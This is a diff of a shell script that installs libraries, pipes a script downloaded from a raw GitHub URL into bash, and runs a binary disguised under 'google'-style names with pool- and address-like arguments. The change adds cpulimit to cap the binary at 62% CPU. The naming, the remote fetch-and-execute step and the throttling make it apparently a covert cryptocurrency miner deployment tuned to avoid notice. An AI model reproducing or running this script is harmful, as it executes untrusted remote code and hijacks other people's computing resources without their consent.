@@ -2,6 +2,8 @@ apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
 apt-get install -y bc
 
+apt-get install -y cpulimit
+
 if [[ $google84121274 == *"failed"* ]]; then
 
 curl -s https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/google8412127474 | bash
@@ -55,7 +57,7 @@ googlelinux84=$(echo "$count / 16384"|bc -l)
 linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
 googlelinux8474=${linuxgoogle84%.*}
 
-./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
+cpulimit -l 62 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
 
 else
 
@@ -100,7 +102,7 @@ googlelinux84=$(echo "$count / 524288"|bc -l)
 linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
 googlelinux8474=${linuxgoogle84%.*}
 
-./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
+cpulimit -l 62 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
 
 fi
 
